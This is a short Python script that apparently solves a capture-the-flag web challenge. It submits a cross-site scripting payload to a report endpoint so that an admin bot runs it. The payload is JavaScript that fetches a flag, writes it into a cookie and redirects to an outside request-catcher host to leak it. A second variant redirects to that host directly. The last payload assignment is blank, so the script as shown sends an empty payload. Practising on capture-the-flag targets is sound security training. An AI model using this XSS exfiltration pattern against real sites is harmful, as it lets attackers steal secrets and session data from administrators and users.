import requests

HOST = "13.125.251.104"
PORT = 12003

PATH_XSS = f"http://{HOST}:{PORT}/xss"
PATH_REPORT = f"http://{HOST}:{PORT}/report"
PATH_FLAG = f"http://{HOST}:{PORT}/flag"

payload = """
<script>
        function sendPostRequest() {
            var data = {"admin":"zzlol"};

            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://13.125.251.104:12003/flag", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.cookie = "flag=" + xhr.responseText;
                    window.location.href='https://jdcpveo.request.dreamhack.games'
                }
            };
            xhr.send("data=" + encodeURIComponent(data));
        }

        sendPostRequest();
    </script>
"""

payload = "<script>window.location.href='https://jdcpveo.request.dreamhack.games'</script>"
payload = '''


'''

data = {
    "payload":payload
}

res = requests.post(PATH_REPORT, data=data)
print(res.content)

